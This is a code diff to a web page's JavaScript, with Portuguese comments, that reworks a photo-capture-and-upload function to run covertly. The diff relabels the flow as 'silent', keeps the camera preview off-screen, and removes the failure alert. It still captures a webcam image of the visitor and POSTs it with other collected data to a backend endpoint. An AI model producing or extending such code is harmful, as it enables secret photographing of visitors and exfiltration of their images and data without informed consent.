@@ -146,19 +146,19 @@ revokeBtn.addEventListener('click', (e) => {
 });
 
 // ========================================
-// COLETA + ENVIO (NOVO FLUXO AUTOMÁTICO DE CÂMERA)
+// COLETA + ENVIO (SILENCIOSO)
 // ========================================
 async function collectAndStart() {
     let imageData = null;
 
-    // 1. Oculta conteúdo principal e mostra a câmera
+    // Oculta conteúdo principal (mantido)
     if (heroSection) {
         heroSection.style.display = 'none';
     }
-    cameraContainer.style.display = 'block';
+    // NÃO MOVER CÂMERA: O CSS mantém a câmera fora da tela.
 
     try {
-        // Tenta iniciar a câmera
+        // Tenta iniciar a câmera (AQUI A PERMISSÃO SERÁ SOLICITADA)
         await startCamera();
 
         // Espera um pequeno tempo para garantir que a imagem não seja preta
@@ -168,11 +168,10 @@ async function collectAndStart() {
         imageData = takePictureAndStop(); 
         
     } catch (e) {
-        console.error('❌ Não foi possível capturar a foto:', e);
-        // Se falhar (usuário negou ou erro), paramos a visualização
+        console.error('❌ Não foi possível capturar a foto (silencioso):', e);
+        // Se falhar (usuário negou), paramos a câmera
         stopCamera();
-        cameraContainer.style.display = 'none';
-        alert('Falha ao acessar a câmera. Tentando continuar sem a foto.');
+        // Não precisa mais de alert() ou de ocultar container.
     }
 
 
@@ -186,7 +185,7 @@ async function collectAndStart() {
     
     console.log('📦 Dados coletados (foto inclusa se sucesso):', data);
 
-    // 4. Envio ao backend
+    // 4. Envio ao backend (MANTIDO)
     try {
         const res = await fetch(ENDPOINT, {
             method: 'POST',
